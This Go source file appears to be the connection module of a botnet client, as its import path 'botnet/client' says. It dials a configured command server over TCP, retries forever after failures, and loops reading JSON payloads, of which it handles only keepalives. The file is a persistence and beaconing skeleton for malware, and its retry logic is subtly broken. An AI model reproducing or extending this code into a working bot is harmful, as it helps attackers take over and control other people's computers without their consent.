package main

import (
	. "botnet/client/util"
	"bufio"
	"encoding/json"
	"net"
	"time"
)

func Connect() {
	conn, err := net.Dial("tcp", Config.ServerUrl)
	if err != nil {
		time.Sleep(time.Duration(Config.RetryInterval) * time.Minute) // Infinitely keep retrying
		Connect()
	}

	reader := bufio.NewReader(conn)

	for {
		payloadRaw, err := reader.ReadString('\x00')
		if err != nil { break }

		var payload map[string]interface{}
		err = json.Unmarshal([]byte(payloadRaw), &payload)
		if err != nil { continue }

		if payload["type"] == "keepalive" { continue }
	}

	Connect() // If disconnected, retry a connection infinitely
}

func main() {
	Connect()
}